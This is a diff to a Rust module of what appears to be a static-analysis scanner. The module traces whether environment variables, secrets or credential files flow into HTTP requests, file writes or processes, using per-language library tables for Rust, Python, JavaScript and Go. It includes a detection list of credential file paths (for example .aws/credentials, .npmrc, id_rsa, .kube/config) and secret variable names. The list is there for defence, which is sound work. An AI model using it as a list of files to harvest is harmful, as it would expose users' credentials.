@@ -4,14 +4,21 @@
 //! Track assignments and local helper summaries, keeping HTTP authentication
 //! separate from request bodies. Unknown code is not assumed to be an HTTP
 //! client. Analysis limits are surfaced rather than reported as clean scans.
-use super::langs::{self, Lang};
+//!
+//! What counts as a payload source, an HTTP send or a file operation is data:
+//! one [`Model`] per language. The evaluator only follows values through
+//! syntax.
+use super::langs::{self, Lang, LangConfig};
+use super::scope::Scope;
 use super::visit::{self, NodeIds, Visit};
-use super::{MAX_FLOW_DEPTH, named_children};
+use super::{MAX_FLOW_DEPTH, TreeCache, named_children, text};
+use crate::fileid::FileType;
 use crate::package_context::{ContextLimits, SourceFile};
 use crate::value_key;
 use crate::{GoFileFlow, GoPackageFlow, Values};
 use serde_json::json;
 use std::collections::{BTreeMap, HashMap, HashSet};
+use std::sync::atomic::AtomicBool;
 use tree_sitter::Node;
 
 type Bits = u64;
@@ -33,13 +40,294 @@ const CURL_DATA_NEXT: Bits = 8192;
 // property. Keep that state separate from a bulk environment read so aliases
 // such as `const env = process.env` can refine non-secret configuration keys.
 const ENV_OBJECT: Bits = 16384;
-// A selected environment value is distinct from a bulk environment dump.
-// Keep this neutral provenance bit separate so existing bulk-harvest rules
-// cannot mistake normal provider/configuration values for a complete dump.
+// One environment variable read by a call, as opposed to a bulk environment
+// dump. A separate bit keeps provider/configuration values from looking like
+// a complete dump.
 const ENV_VALUE: Bits = 32768;
 const PARAM_START: usize = 24;
 const PARAM_COUNT: usize = 16;
+const PARAM_BITS: Bits = ((1 << PARAM_COUNT) - 1) << PARAM_START;
+/// Evaluation steps per analysis, past which it stops and is reported
+/// truncated.
 const LIMIT: usize = 200_000;
+/// Rounds of helper-summary refinement before the analysis gives up on a
+/// fixed point and is reported truncated.
+const MAX_ROUNDS: usize = 8;
+/// Largest source analysed at all.
+const MAX_SOURCE_BYTES: usize = 2 * 1024 * 1024;
+
+/// Path fragments of credential files.
+const SECRET_PATHS: &[&str] = &[
+    ".npmrc",
+    ".pypirc",
+    ".aws/credentials",
+    ".netrc",
+    ".git-credentials",
+    "id_rsa",
+    "id_ed25519",
+    ".env",
+    ".kube/config",
+    "application_default_credentials.json",
+    ".terraform.d/credentials",
+    "credentials.tfrc.json",
+];
+/// Path fragments of Cargo's credential file.
+const CARGO_CREDENTIAL_PATHS: &[&str] = &[".cargo/credentials", ".cargo\\\\credentials"];
+/// File names that are Cargo's credential file once joined to `CARGO_HOME`.
+const CARGO_CREDENTIAL_NAMES: &[&str] = &["credentials", "credentials.toml"];
+/// Environment variable name fragments that hold secrets.
+const SECRET_VARIABLES: &[&str] = &[
+    "_TOKEN",
+    "_SECRET",
+    "_PASSWORD",
+    "AWS_ACCESS_KEY_ID",
+    "AWS_SECRET_ACCESS_KEY",
+];
+
+/// How an HTTP send carries its body.
+#[derive(Clone, Copy)]
+enum Body {
+    /// Not in this call; a request builder may add it later.
+    None,
+    /// The argument at this index.
+    Arg(usize),
+    /// The first argument, a request built with its body.
+    Request,
+    /// The [`Model::keyword_bodies`] keyword arguments, or the second
+    /// positional one.
+    Keywords,
+    /// The `body` field of the second argument, an options object.
+    Options,
+}
+
+/// An HTTP send: a free function, or a method of an HTTP client.
+struct Send {
+    name: &'static str,
+    on_client: bool,
+    body: Body,
+}
+
+const fn send(name: &'static str, body: Body) -> Send {
+    Send {
+        name,
+        on_client: false,
+        body,
+    }
+}
+
+const fn client_send(name: &'static str, body: Body) -> Send {
+    Send {
+        name,
+        on_client: true,
+        body,
+    }
+}
+
+/// One language's library knowledge. Names are canonical: import aliases
+/// are already resolved (`h.Post` with `h "net/http"` is `net/http.Post`).
+struct Model {
+    /// Calls returning the whole environment.
+    environ_calls: &'static [&'static str],
+    /// Member reads that are the whole environment.
+    environ_members: &'static [&'static str],
+    /// Calls returning the one variable their first argument names.
+    env_var_calls: &'static [&'static str],
+    /// Prefixes of member reads that select one variable (`os.environ[`).
+    env_var_members: &'static [&'static str],
+    /// Calls constructing an HTTP client.
+    client_calls: &'static [&'static str],
+    /// Member reads that are an HTTP client.
+    client_members: &'static [&'static str],
+    /// Types whose parameters and composite literals are HTTP clients.
+    client_types: &'static [&'static str],
+    /// Calls building a request whose body is their last argument.
+    request_calls: &'static [&'static str],
+    sends: &'static [Send],
+    /// Modules whose functions are matched as client methods
+    /// (`requests.post` as `post` on a client).
+    client_modules: &'static [&'static str],
+    /// Whether a send without its body returns a request builder.
+    sends_return_builders: bool,
+    /// Methods of a request builder whose arguments are the body.
+    body_methods: &'static [&'static str],
+    /// Methods of a client whose arguments are the body.
+    client_body_methods: &'static [&'static str],
+    /// Keyword arguments that carry a [`Body::Keywords`] body.
+    keyword_bodies: &'static [&'static str],
+    /// Calls reading a file named by their arguments.
+    file_read_calls: &'static [&'static str],
+    /// Methods reading a file; called on a reader, they fill the buffer
+    /// passed as their first argument.
+    file_read_methods: &'static [&'static str],
+    /// Calls writing a file whose path is their first argument.
+    file_write_calls: &'static [&'static str],
+    /// Methods whose arguments join their receiver's contents.
+    append_methods: &'static [&'static str],
+    /// Methods that read only metadata, none of their receiver's bytes.
+    metadata_methods: &'static [&'static str],
+    /// Methods that set authentication, never body.
+    auth_methods: &'static [&'static str],
+    /// Callee spellings whose calls set request headers, never body.
+    header_selectors: &'static [&'static str],
+    /// Calls starting a process whose first argument is the program.
+    process_calls: &'static [&'static str],
+}
+
+const EMPTY: Model = Model {
+    environ_calls: &[],
+    environ_members: &[],
+    env_var_calls: &[],
+    env_var_members: &[],
+    client_calls: &[],
+    client_members: &[],
+    client_types: &[],
+    request_calls: &[],
+    sends: &[],
+    client_modules: &[],
+    sends_return_builders: false,
+    body_methods: &[],
+    client_body_methods: &[],
+    keyword_bodies: &[],
+    file_read_calls: &[],
+    file_read_methods: &[],
+    file_write_calls: &[],
+    append_methods: &["push", "append", "extend", "insert"],
+    metadata_methods: &[],
+    auth_methods: &[],
+    header_selectors: &[],
+    process_calls: &[],
+};
+
+const RUST: Model = Model {
+    environ_calls: &[
+        "std::env::vars",
+        "std::env::vars_os",
+        "env::vars",
+        "env::vars_os",
+    ],
+    env_var_calls: &[
+        "std::env::var",
+        "std::env::var_os",
+        "env::var",
+        "env::var_os",
+    ],
+    client_calls: &[
+        "reqwest::Client::new",
+        "reqwest::Client::builder",
+        "reqwest::blocking::Client::new",
+        "reqwest::blocking::Client::builder",
+        "curl::easy::Easy::new",
+    ],
+    client_types: &[
+        "reqwest::Client",
+        "reqwest::blocking::Client",
+        "curl::easy::Easy",
+    ],
+    sends: &[
+        client_send("post", Body::None),
+        client_send("put", Body::None),
+        client_send("patch", Body::None),
+        client_send("get", Body::None),
+        client_send("request", Body::None),
+        send("ureq::post", Body::None),
+        send("ureq::put", Body::None),
+        send("ureq::patch", Body::None),
+        send("ureq::get", Body::None),
+    ],
+    sends_return_builders: true,
+    body_methods: &[
+        "body",
+        "json",
+        "form",
+        "multipart",
+        "send_json",
+        "send_form",
+        "send_bytes",
+        "send_string",
+        "send",
+    ],
+    client_body_methods: &["post_fields_copy"],
+    file_read_calls: &[
+        "std::fs::read",
+        "std::fs::read_to_string",
+        "fs::read",
+        "fs::read_to_string",
+    ],
+    file_read_methods: &["read_to_end", "read_to_string"],
+    file_write_calls: &["std::fs::write", "fs::write"],
+    metadata_methods: &["len", "is_empty", "is_ok", "is_err", "is_some", "is_none"],
+    process_calls: &["std::process::Command::new", "Command::new"],
+    ..EMPTY
+};
+
+const PYTHON: Model = Model {
+    environ_members: &["os.environ"],
+    env_var_calls: &["os.getenv", "os.environ.get"],
+    env_var_members: &["os.environ["],
+    client_calls: &["requests.Session", "httpx.Client", "httpx.AsyncClient"],
+    sends: &[
+        client_send("get", Body::None),
+        client_send("head", Body::None),
+        client_send("delete", Body::None),
+        client_send("options", Body::None),
+        client_send("post", Body::Keywords),
+        client_send("put", Body::Keywords),
+        client_send("patch", Body::Keywords),
+        client_send("request", Body::Keywords),
+    ],
+    client_modules: &["requests.", "httpx."],
+    keyword_bodies: &["data", "json", "files"],
+    file_read_calls: &["open"],
+    file_read_methods: &["read_text", "read_bytes"],
+    ..EMPTY
+};
+
+const ECMASCRIPT: Model = Model {
+    environ_members: &["process.env"],
+    env_var_members: &["process.env.", "process.env["],
+    sends: &[send("fetch", Body::Options)],
+    file_read_calls: &["fs.readFileSync", "fs.readFile"],
+    ..EMPTY
+};
+
+const GO: Model = Model {
+    environ_calls: &["os.Environ"],
+    env_var_calls: &["os.Getenv", "os.LookupEnv"],
+    client_members: &["net/http.DefaultClient"],
+    client_types: &["net/http.Client"],
+    request_calls: &["net/http.NewRequest", "net/http.NewRequestWithContext"],
+    sends: &[
+        send("net/http.Post", Body::Arg(2)),
+        send("net/http.PostForm", Body::Arg(1)),
+        client_send("Post", Body::Arg(2)),
+        client_send("PostForm", Body::Arg(1)),
+        client_send("Do", Body::Request),
+    ],
+    file_read_calls: &[
+        "os.ReadFile",
+        "io/ioutil.ReadFile",
+        "os.Open",
+        "io.ReadAll",
+        "io/ioutil.ReadAll",
+    ],
+    file_write_calls: &["os.WriteFile", "io/ioutil.WriteFile"],
+    // Form and body builders; headers and authentication are not body.
+    append_methods: &["Set", "Add", "Write", "WriteString"],
+    auth_methods: &["SetBasicAuth", "AddCookie"],
+    header_selectors: &[".Header."],
+    ..EMPTY
+};
+
+/// The [`Model`] of an analysed language.
+fn model(language: Lang) -> Option<&'static Model> {
+    match language {
+        Lang::Rust => Some(&RUST),
+        Lang::Python => Some(&PYTHON),
+        Lang::JavaScript | Lang::TypeScript => Some(&ECMASCRIPT),
+        Lang::Go => Some(&GO),
+        _ => None,
+    }
+}
 
 #[derive(Clone, Default, Debug, PartialEq, Eq)]
 struct Summary {
@@ -50,203 +338,81 @@ struct Summary {
     reads: Bits,
 }
 
+type Bindings<'g> = Scope<'g, Bits>;
+
+/// The index of one file, built once however many rounds analyse it.
+struct Prepared<'t> {
+    /// Unambiguous helpers by name. A Go `init` is keyed `init@<offset>`,
+    /// since a package may declare several.
+    functions: BTreeMap<String, Node<'t>>,
+    aliases: HashMap<String, String>,
+    /// Node ids of test-only code, which is never evaluated.
+    test_only: HashSet<usize>,
+}
+
 struct Analysis<'s> {
     source: &'s str,
     language: Lang,
+    config: &'static LangConfig,
+    model: &'static Model,
     aliases: HashMap<String, String>,
-    /// Node ids of test-only code, which is never evaluated.
-    excluded: HashSet<usize>,
+    test_only: &'s HashSet<usize>,
     summaries: BTreeMap<String, Summary>,
     budget: usize,
     truncated: bool,
 }
 
-/// Name → bits bindings, layered over an optional enclosing scope that it
-/// reads through but never changes.
-///
-/// Every function body starts from the module-level bindings and every `if`
-/// branch from the bindings before it. Copying those per function or per
-/// branch made the analysis quadratic (helpers × globals, or `if` statements
-/// × names bound before them: 5k of each took 70 s); a layer records only
-/// what it binds or unbinds. A `None` in `local` hides an enclosing binding
-/// the layer removed.
-#[derive(Default)]
-struct Scope<'g> {
-    parent: Option<&'g Scope<'g>>,
-    local: HashMap<String, Option<Bits>>,
-}
-
-impl<'g> Scope<'g> {
-    /// A top-level scope holding `map`.
-    fn from_map(map: HashMap<String, Bits>) -> Self {
-        Self {
-            parent: None,
-            local: map
-                .into_iter()
-                .map(|(name, bits)| (name, Some(bits)))
-                .collect(),
-        }
-    }
-    /// An empty layer over `parent`.
-    fn under(parent: &'g Scope<'g>) -> Self {
-        Self {
-            parent: Some(parent),
-            local: HashMap::new(),
-        }
-    }
-    fn get(&self, name: &str) -> Option<Bits> {
-        match self.local.get(name) {
-            Some(bits) => *bits,
-            None => self.parent.and_then(|parent| parent.get(name)),
-        }
-    }
-    fn contains(&self, name: &str) -> bool {
-        self.get(name).is_some()
-    }
-    fn insert(&mut self, name: String, bits: Bits) {
-        self.local.insert(name, Some(bits));
-    }
-    /// Add `bits` to `name`'s binding, binding it if it is unbound.
-    fn add_bits(&mut self, name: &str, bits: Bits) {
-        let bits = self.get(name).unwrap_or(0) | bits;
-        self.insert(name.to_string(), bits);
-    }
-    fn remove(&mut self, name: &str) {
-        if self.parent.is_some_and(|parent| parent.contains(name)) {
-            self.local.insert(name.to_string(), None);
-        } else {
-            self.local.remove(name);
-        }
-    }
-    /// The bindings of a top-level scope, which has no parent.
-    fn into_map(self) -> HashMap<String, Bits> {
-        self.local
-            .into_iter()
-            .filter_map(|(name, bits)| Some((name, bits?)))
-            .collect()
-    }
-}
-
-/// Definitions the analysis indexes by name as local helpers.
-pub(super) const FUNCTION_KINDS: &[&str] = &[
-    "function_item",
-    "function_definition",
-    "function_declaration",
-    "generator_function_declaration",
-];
-
-/// Bound on the nodes the function-index walk keeps pending, past which it
-/// stops and the analysis is reported truncated.
-const INDEX_STACK_LIMIT: usize = 10_000;
-
-/// Whether [`emit`] analyses `source` in `language` at all, and so needs a
-/// [`Collector`] from the walk.
-fn analysed(language: Lang, source: &str) -> bool {
-    matches!(
-        language,
-        Lang::Rust | Lang::Python | Lang::JavaScript | Lang::TypeScript | Lang::Go
-    ) && source.len() <= 2 * 1024 * 1024
-}
-
-/// What the analysis needs from the shared walk ([`super::visit`]): the index
-/// of named helper functions, Python import aliases, and for Rust the
-/// test-only nodes it never evaluates.
-///
-/// The index came from a walk of its own, which popped an explicit stack of
-/// named children: right to left, skipping test-only nodes, not descending
-/// into definitions, and stopping once more than [`INDEX_STACK_LIMIT`] nodes
-/// were pending. The collector records what that walk did, on exit from each
-/// node, as events; reversed, they replay in that walk's order and stop where
-/// it stopped.
+/// What the analysis needs from the shared walk ([`super::visit`]): the
+/// named helper functions and the Python imports, in source order.
+/// Definitions are not descended into, since nested definitions have
+/// separate lexical scopes rather than global names, and test-only items are
+/// skipped.
 pub(super) struct Collector<'t> {
     source: &'t str,
     language: Lang,
-    /// Rust nodes after a run of attributes that includes `#[cfg(test)]` or
-    /// `#[test]`.
-    excluded: HashSet<usize>,
-    /// One per open node of the walk.
-    frames: Vec<Frame>,
+    /// One per open node: whether its named children are index candidates.
+    expanded: Vec<bool>,
     events: Vec<Event<'t>>,
-}
-
-#[derive(Clone, Copy)]
-struct Frame {
-    /// The index walk pushed this node's named children.
-    expanded: bool,
-    /// Nodes the index walk had pushed but not yet popped when it reached
-    /// this one: the named siblings left of it and of each ancestor.
-    pending: usize,
-    /// Reached by the test-attribute scan, which follows named children.
-    scanned: bool,
-    /// The named children entered so far end in a run of attributes that
-    /// includes a test attribute.
-    after_test_attribute: bool,
 }
 
 enum Event<'t> {
     /// A named definition: the index key and the function node.
     Function(String, Node<'t>),
     PythonImport(Node<'t>),
-    /// The index walk's stack outgrew [`INDEX_STACK_LIMIT`] here.
-    Overflow,
 }
 
-/// A finished [`Collector`].
+/// A finished [`Collector`], with the test-only nodes the walk found.
 pub(super) struct Collected<'t> {
-    excluded: HashSet<usize>,
-    /// In the index walk's order.
     events: Vec<Event<'t>>,
+    test_only: HashSet<usize>,
 }
 
 impl<'t> Collector<'t> {
     /// A collector for `source`, or `None` when [`emit`] will not analyse it.
     pub(super) fn new(source: &'t str, language: Lang) -> Option<Self> {
-        analysed(language, source).then(|| Self {
+        (model(language).is_some() && source.len() <= MAX_SOURCE_BYTES).then(|| Self {
             source,
             language,
-            excluded: HashSet::new(),
-            frames: Vec::new(),
+            expanded: Vec::new(),
             events: Vec::new(),
         })
     }
 
-    pub(super) fn enter(&mut self, visit: &Visit<'t>, ids: &NodeIds) {
+    /// Record `visit`'s node; `test_only` holds the test-only nodes the walk
+    /// has found so far, which include this one when it is.
+    pub(super) fn enter(
+        &mut self,
+        visit: &Visit<'t>,
+        ids: &NodeIds,
+        test_only: Option<&HashSet<usize>>,
+    ) {
         let node = visit.node;
-        let (reached, scanned, pending) = match self.frames.last_mut() {
-            None => (true, true, 0),
-            Some(parent) => {
-                let scanned = parent.scanned && visit.named;
-                // Test attributes are Rust syntax; no other grammar has them.
-                // The run is tracked across siblings, as asking
-                // `Node::prev_named_sibling` per node would walk down from
-                // the root every time.
-                if scanned && self.language == Lang::Rust {
-                    if parent.after_test_attribute {
-                        self.excluded.insert(node.id());
-                    }
-                    if ids.attribute_item.contains(visit.kind_id) {
-                        let text = self.source[node.byte_range()]
-                            .split_whitespace()
-                            .collect::<String>();
-                        parent.after_test_attribute |= text == "#[cfg(test)]" || text == "#[test]";
-                    } else {
-                        parent.after_test_attribute = false;
-                    }
-                }
-                (
-                    parent.expanded && visit.named,
-                    scanned,
-                    parent.pending + visit.named_index,
-                )
-            }
-        };
+        let reached = visit.named && self.expanded.last().is_none_or(|&expanded| expanded);
         let mut expanded = false;
-        if reached && !self.excluded.contains(&node.id()) {
-            if ids.payload_function.contains(visit.kind_id) {
-                // Nested definitions have separate lexical scopes, not global
-                // names, so a definition is never expanded.
+        if reached && !test_only.is_some_and(|ids| ids.contains(&node.id())) {
+            if ids.function.contains(visit.kind_id) {
                 if let Some(name) = node.child_by_field_name("name") {
-                    let name = &self.source[name.byte_range()];
+                    let name = text(name, self.source);
                     let key = if self.language == Lang::Go && name == "init" {
                         format!("init@{}", node.start_byte())
                     } else {
@@ -262,67 +428,121 @@ impl<'t> Collector<'t> {
                         .zip(node.child_by_field_name("value"))
                 })
                 .flatten()
-                .filter(|(_, value)| {
-                    matches!(value.kind(), "arrow_function" | "function_expression")
-                })
+                .filter(|(_, value)| ids.function.contains(value.kind_id()))
             {
-                let key = self.source[name.byte_range()].to_string();
-                self.events.push(Event::Function(key, value));
+                self.events
+                    .push(Event::Function(text(name, self.source).to_string(), value));
             } else {
                 expanded = true;
+                if self.language == Lang::Python && ids.python_import.contains(visit.kind_id) {
+                    self.events.push(Event::PythonImport(node));
+                }
             }
         }
-        self.frames.push(Frame {
-            expanded,
-            pending,
-            scanned,
-            after_test_attribute: false,
-        });
+        self.expanded.push(expanded);
     }
 
-    pub(super) fn exit(&mut self, visit: &Visit<'t>, ids: &NodeIds) {
-        let Some(frame) = self.frames.pop() else {
-            return;
-        };
-        if frame.expanded {
-            // Recorded in reverse: the index walk handled the node's Python
-            // import, then pushed its named children and checked the stack.
-            if frame.pending + visit.node.named_child_count() > INDEX_STACK_LIMIT {
-                self.events.push(Event::Overflow);
-            }
-            if self.language == Lang::Python && ids.python_import.contains(visit.kind_id) {
-                self.events.push(Event::PythonImport(visit.node));
-            }
-        }
+    pub(super) fn exit(&mut self) {
+        self.expanded.pop();
     }
 
-    pub(super) fn finish(&mut self) {
-        self.events.reverse();
-    }
-
-    pub(super) fn into_collected(self) -> Collected<'t> {
+    pub(super) fn into_collected(self, test_only: HashSet<usize>) -> Collected<'t> {
         Collected {
-            excluded: self.excluded,
             events: self.events,
+            test_only,
         }
     }
 }
 
 /// Walk `root` for the analysis alone, when no shared walk collected for it.
-fn collect<'t>(root: Node<'t>, source: &'t str, language: Lang) -> Collected<'t> {
-    let config = langs::config_for(language.file_type()).expect("every Lang has a LangConfig");
+fn collect<'t>(root: Node<'t>, source: &'t str, config: &'static LangConfig) -> Collected<'t> {
     let mut collectors = visit::Collectors {
-        payload: Collector::new(source, language),
+        payload: Collector::new(source, config.lang),
         ..visit::Collectors::default()
     };
     visit::walk(root, source, config, &mut collectors);
-    collectors.payload.map_or_else(
-        || Collected {
-            excluded: HashSet::new(),
-            events: Vec::new(),
-        },
-        Collector::into_collected,
-    )
+    Collected {
+        events: collectors
+            .payload
+            .map(|collector| collector.events)
+            .unwrap_or_default(),
+        test_only: HashSet::new(),
+    }
+}
+
+/// The import aliases [`emit`] resolves names through, computed once by the
+/// caller.
+pub(super) enum Imports<'a> {
+    None,
+    /// Rust `use` paths, `path as alias` when renamed.
+    Rust(&'a [(String, u64)]),
+    Go(&'a [super::go_syntax::Import<'a>]),
+}
+
+/// Index `collected` once: helpers by name, dropping ambiguous names, and
+/// import aliases from `imports` and the Python imports.
+fn prepare<'t>(
+    source: &'t str,
+    language: Lang,
+    collected: Collected<'t>,
+    imports: &Imports<'_>,
+) -> Prepared<'t> {
+    let mut aliases = HashMap::new();
+    match imports {
+        Imports::Go(imports) => {
+            for import in *imports {
+                let local = import
+                    .name
+                    .unwrap_or_else(|| import.path.rsplit('/').next().unwrap_or(import.path));
+                if !matches!(local, "." | "_") {
+                    aliases.insert(local.to_string(), import.path.to_string());
+                }
+            }
+        }
+        Imports::Rust(imports) => {
+            for (import, _) in *imports {
+                let (name, local) = import
+                    .split_once(" as ")
+                    .unwrap_or_else(|| (import, import.rsplit("::").next().unwrap_or("")));
+                // Conflicting aliases are deliberately not canonicalized.
+                aliases
+                    .entry(local.to_string())
+                    .and_modify(|old: &mut String| {
+                        if old != name {
+                            old.clear();
+                        }
+                    })
+                    .or_insert_with(|| name.to_string());
+            }
+        }
+        Imports::None => {}
+    }
+    let mut functions = BTreeMap::new();
+    let mut ambiguous = Vec::new();
+    for event in collected.events {
+        match event {
+            Event::Function(key, node) => {
+                if functions.insert(key.clone(), node).is_some() {
+                    ambiguous.push(key);
+                }
+            }
+            Event::PythonImport(node) => python_imports(node, source, &mut aliases),
+        }
+    }
+    for name in ambiguous {
+        tracing::debug!(
+            target: "filefacts::source",
+            language = language.name(),
+            helper = %name,
+            "payload flow: helper defined more than once, left unresolved"
+        );
+        functions.remove(&name);
+    }
+    Prepared {
+        functions,
+        aliases,
+        test_only: collected.test_only,
+    }
 }
 
 /// Analyse `root`, using what the shared walk collected when it ran a
@@ -330,102 +550,75 @@ fn collect<'t>(root: Node<'t>, source: &'t str, language: Lang) -> Collected<'t>
 pub(super) fn emit<'t>(
     root: Node<'t>,
     source: &'t str,
-    language: Lang,
+    config: &'static LangConfig,
     values: &mut Values,
     collected: Option<Collected<'t>>,
+    imports: &Imports<'_>,
 ) {
-    emit_seeded(
+    if model(config.lang).is_none() {
+        return;
+    }
+    if source.len() > MAX_SOURCE_BYTES {
+        tracing::debug!(
+            target: "filefacts::source",
+            language = config.name(),
+            len = source.len(),
+            max = MAX_SOURCE_BYTES,
+            "payload flow: source too large to analyse"
+        );
+        values.insert_key(value_key!("source.payload_flow.truncated"), json!(true));
+        return;
+    }
+    let collected = collected.unwrap_or_else(|| collect(root, source, config));
+    let prepared = prepare(source, config.lang, collected, imports);
+    analyse(
         root,
         source,
-        language,
+        config,
+        &prepared,
         values,
         &BTreeMap::new(),
-        &HashMap::new(),
-        collected,
+        &BTreeMap::new(),
     );
 }
 
-fn emit_seeded<'t>(
+/// Summarise every helper to a fixed point, then the module, and write the
+/// events. Returns the helper summaries and module bindings a package-level
+/// caller seeds the next round with.
+fn analyse<'t>(
     root: Node<'t>,
     source: &'t str,
-    language: Lang,
+    config: &'static LangConfig,
+    prepared: &'t Prepared<'t>,
     values: &mut Values,
     seeds: &BTreeMap<String, Summary>,
-    global_seeds: &HashMap<String, Bits>,
-    collected: Option<Collected<'t>>,
-) -> (BTreeMap<String, Summary>, HashMap<String, Bits>) {
-    if !matches!(
-        language,
-        Lang::Rust | Lang::Python | Lang::JavaScript | Lang::TypeScript | Lang::Go
-    ) {
-        return (BTreeMap::new(), HashMap::new());
-    }
-    if !analysed(language, source) {
-        values.insert_key(value_key!("source.payload_flow.truncated"), json!(true));
-        return (BTreeMap::new(), HashMap::new());
-    }
-    let Collected { excluded, events } =
-        collected.unwrap_or_else(|| collect(root, source, language));
+    global_seeds: &BTreeMap<String, Bits>,
+) -> (BTreeMap<String, Summary>, BTreeMap<String, Bits>) {
+    let language = config.lang;
+    let Some(model) = model(language) else {
+        return (BTreeMap::new(), BTreeMap::new());
+    };
     let mut a = Analysis {
         source,
         language,
-        aliases: HashMap::new(),
-        excluded,
+        config,
+        model,
+        aliases: prepared.aliases.clone(),
+        test_only: &prepared.test_only,
         summaries: seeds.clone(),
         budget: LIMIT,
         truncated: false,
     };
-    if language == Lang::Rust {
-        super::rust_syntax::execution_facts(root, source, values);
-    }
-    if language == Lang::Go {
-        super::go_syntax::execution_facts(root, source, values);
-        a.aliases = super::go_syntax::imports(root, source);
-    }
-    if language == Lang::Rust {
-        for (import, _) in super::rust_syntax::imports(root, source) {
-            let (name, local) = import
-                .split_once(" as ")
-                .unwrap_or_else(|| (&import, import.rsplit("::").next().unwrap_or("")));
-            // Conflicting aliases are deliberately not canonicalized.
-            a.aliases
-                .entry(local.to_string())
-                .and_modify(|old| {
-                    if old != name {
-                        old.clear();
-                    }
-                })
-                .or_insert_with(|| name.to_string());
-        }
-    }
-    let mut functions = BTreeMap::new();
-    let mut ambiguous = Vec::new();
-    for event in events {
-        match event {
-            Event::Function(key, node) => {
-                if functions.insert(key.clone(), node).is_some() {
-                    ambiguous.push(key);
-                }
-            }
-            Event::PythonImport(node) => a.python_imports(node),
-            Event::Overflow => {
-                a.truncated = true;
-                break;
-            }
-        }
-    }
-    for name in ambiguous {
-        functions.remove(&name);
-    }
-    // Fixed point handles helper declaration order and bounded recursion.
-    for iteration in 0..8 {
+    let functions = &prepared.functions;
+    // Rounds settle helper declaration order and bounded recursion.
+    for round in 0..MAX_ROUNDS {
         let before = a.summaries.clone();
-        let mut globals = Scope::from_map(global_seeds.clone());
+        let mut globals = Bindings::over(global_seeds);
         if language == Lang::Go {
             a.eval(root, &mut globals, &mut Summary::default(), 0);
         }
-        for (name, node) in &functions {
-            let mut bindings = Scope::under(&globals);
+        for (name, node) in functions {
+            let mut bindings = Bindings::under(&globals);
             if let Some(params) = node.child_by_field_name("parameters") {
                 for (index, param) in named_children(params).enumerate().take(PARAM_COUNT) {
                     let pat = param
@@ -437,14 +630,10 @@ fn emit_seeded<'t>(
                         while let Some(inner) = ty.child_by_field_name("type") {
                             ty = inner;
                         }
-                        let ty = a.canonical(a.text(ty));
-                        if matches!(
-                            ty.as_str(),
-                            "reqwest::Client"
-                                | "reqwest::blocking::Client"
-                                | "curl::easy::Easy"
-                                | "net/http.Client"
-                        ) {
+                        if model
+                            .client_types
+                            .contains(&a.canonical(text(ty, source)).as_str())
+                        {
                             bits |= CLIENT;
                         }
                     }
@@ -463,29 +652,30 @@ fn emit_seeded<'t>(
         if a.summaries == before {
             break;
         }
-        if iteration == 7 {
+        if round == MAX_ROUNDS - 1 {
+            tracing::debug!(
+                target: "filefacts::source",
+                language = language.name(),
+                rounds = MAX_ROUNDS,
+                "payload flow: helper summaries did not settle"
+            );
             a.truncated = true;
         }
     }
     let mut events = Vec::new();
-    for name in functions.keys() {
-        let Some(summary) = a.summaries.get(name) else {
-            continue;
-        };
-        let offset = functions.get(name).map_or(0, Node::start_byte);
-        events.extend(events_for(summary, name, offset));
+    for (name, node) in functions {
+        if let Some(summary) = a.summaries.get(name) {
+            events.extend(events_for(summary, name, node.start_byte()));
+        }
     }
     let mut top = Summary::default();
-    let mut globals = Scope::from_map(global_seeds.clone());
+    let mut globals = Bindings::over(global_seeds);
     a.eval(root, &mut globals, &mut top, 0);
     events.extend(events_for(&top, "<module>", 0));
     if language == Lang::Go {
         let mut startup = top.clone();
-        for name in functions.keys() {
-            let Some(summary) = a.summaries.get(name) else {
-                continue;
-            };
-            if name.starts_with("init@") {
+        for (name, summary) in &a.summaries {
+            if name.starts_with("init@") && functions.contains_key(name) {
                 startup.body |= summary.body;
                 startup.http |= summary.http;
                 startup.write_path |= summary.write_path;
@@ -502,6 +692,14 @@ fn emit_seeded<'t>(
     }
     events.sort_by_cached_key(serde_json::Value::to_string);
     events.dedup();
+    if a.truncated {
+        tracing::debug!(
+            target: "filefacts::source",
+            language = language.name(),
+            len = source.len(),
+            "payload flow: analysis truncated; events may be incomplete"
+        );
+    }
     values.insert_key(value_key!("source.payload_flow.events"), json!(events));
     values.insert_key(
         value_key!("source.payload_flow.truncated"),
@@ -526,59 +724,89 @@ fn emit_seeded<'t>(
 /// and package variant. No imports are fetched and no source is executed.
 /// Results are bounded by [`ContextLimits::max_flow_members`] and
 /// [`ContextLimits::max_flow_bytes`]; `truncated` means coverage is
-/// incomplete, not clean.
+/// incomplete, not clean. `cancel` stops the parses early, as
+/// [`crate::OpenOptions::cancellation`] does.
 #[must_use]
 pub fn go_package_payload_flow(
     sources: &[SourceFile<'_>],
     limits: &ContextLimits,
+    cancel: Option<&AtomicBool>,
 ) -> GoPackageFlow {
-    let incomplete = GoPackageFlow {
-        files: Vec::new(),
-        truncated: true,
+    let total: usize = sources.iter().map(|f| f.source.len()).sum();
+    let Some(config) = langs::config_for(FileType::Go) else {
+        return GoPackageFlow {
+            files: Vec::new(),
+            truncated: true,
+        };
     };
-    if sources.len() > limits.max_flow_members
-        || sources.iter().map(|f| f.source.len()).sum::<usize>() > limits.max_flow_bytes
-    {
-        return incomplete;
+    if sources.len() > limits.max_flow_members || total > limits.max_flow_bytes {
+        tracing::debug!(
+            target: "filefacts::source",
+            format = "go",
+            members = sources.len(),
+            len = total,
+            "package payload flow: package exceeds the flow budget"
+        );
+        return GoPackageFlow {
+            files: Vec::new(),
+            truncated: true,
+        };
     }
-    let mut parser = tree_sitter::Parser::new();
-    if parser
-        .set_language(&tree_sitter_go::LANGUAGE.into())
-        .is_err()
-    {
-        return incomplete;
-    }
+    // The shared parser applies the work budget, wall-clock backstop and
+    // scanner guards that every other source parse gets.
     let trees: Vec<_> = sources
         .iter()
-        .map(|f| parser.parse(f.source, None))
+        .map(|f| TreeCache::parse(f.source.as_bytes(), FileType::Go, cancel))
         .collect();
-    let mut seeds = BTreeMap::new();
-    let mut globals = HashMap::new();
-    let mut result = Vec::new();
     let mut truncated = false;
-    for iteration in 0..8 {
+    let mut members = Vec::new();
+    for (file, tree) in sources.iter().zip(&trees) {
+        let Some(tree) = tree.cache() else {
+            tracing::debug!(
+                target: "filefacts::source",
+                format = "go",
+                path = file.path,
+                error = tree.diagnostic().map_or("", |d| d.message.as_str()),
+                "package payload flow: member did not parse"
+            );
+            truncated = true;
+            continue;
+        };
+        let root = tree.tree().root_node();
+        let source = tree.source();
+        let mut facts = Values::new();
+        super::go_syntax::execution_facts(root, source, &mut facts);
